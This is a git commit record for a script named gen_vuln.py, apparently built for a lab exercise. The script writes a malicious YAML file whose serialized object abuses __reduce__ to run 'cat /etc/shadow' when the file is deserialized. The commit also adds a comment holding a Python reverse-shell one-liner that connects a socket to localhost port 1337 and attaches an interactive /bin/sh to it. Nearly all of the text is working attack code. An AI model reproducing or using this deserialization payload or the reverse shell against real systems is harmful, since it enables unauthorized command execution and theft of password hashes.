850e7596bc2c770a623dd2405cb1c824d42eb129
Sarah Heading <sarah.heading@outlook.com>
2021-05-07 05:15:27 +1000

    Update gen_vuln.py
    Added the shellcode as a comment.

--- gen_vuln.py
+++ gen_vuln.py
@@ -4,6 +4,8 @@ import subprocess
 class Exploit():
 	def __reduce__(self):
 		return (subprocess.Popen, (('cat', '/etc/shadow'),))
+	
+# "import socket,subprocess,os;s=socket.socket();s.connect(('localhost',1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
 		
 f = open('exploit.yaml', 'w')
 yaml.dump(Exploit(), f)
